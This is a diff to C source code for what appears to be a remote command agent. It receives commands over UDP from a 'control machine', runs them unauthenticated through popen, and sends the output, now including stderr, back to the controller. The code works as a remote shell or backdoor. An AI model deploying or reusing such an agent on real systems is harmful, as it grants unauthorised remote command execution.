@@ -62,7 +62,7 @@ int main(int argc, char const *argv[]) {
     char command[16], path[128];
     pthread_t thread;
 
-    FILE *fp;  // it will open a stream for the output of command
+    FILE *fp;  // It will open a stream for the output of command
 
     // Initialize the host machine
     // popen("chmod 755 *", "r");
@@ -100,7 +100,7 @@ int main(int argc, char const *argv[]) {
         printf("Command:%s", datagram);
 
         sscanf(datagram, "%[^ ]", command);
-        // use function chdir() to replacement command 'cd'
+        // Use function chdir() to replacement command 'cd'
         if (strcmp(command, "cd") == 0) {
             bzero(command, sizeof(command));
             sscanf(datagram, "%*3s%s", path);
@@ -116,23 +116,25 @@ int main(int argc, char const *argv[]) {
             bzero(command, sizeof(command));
             run = 1;
         }
-        // transfer file to the control machine
+        // Transfer file to the control machine
         else if (strcmp(command, "tran") == 0) {
             bzero(command, sizeof(command));
             // ...
-        }else
-            fp = popen(datagram, "r");  // opening a stream by executing the command
+        }else {
+            datagram[strlen(datagram) - 1] = 0;
+            strcat(datagram, " 2>&1\n");  // Redirect the output
+            fp = popen(datagram, "r");  // Opening a stream by executing the command
+        }
         bzero(datagram, sizeof(datagram));
 
-
-        // collecting the output and sending to the control machine
+        // Collecting the output and sending to the control machine
         while(fgets(datagram, sizeof(datagram)-1, fp) != NULL) {
             x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&control_add, sizeof(control_add));
             if (x == -1)
                 printError(2, strerror(errno));
             bzero(datagram, sizeof(datagram));
         }
-        // marking the end of output of command
+        // Marking the end of output of command
         strcpy(datagram, "___EOF___\n");
         x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&control_add, sizeof(control_add));
         if (x == -1)
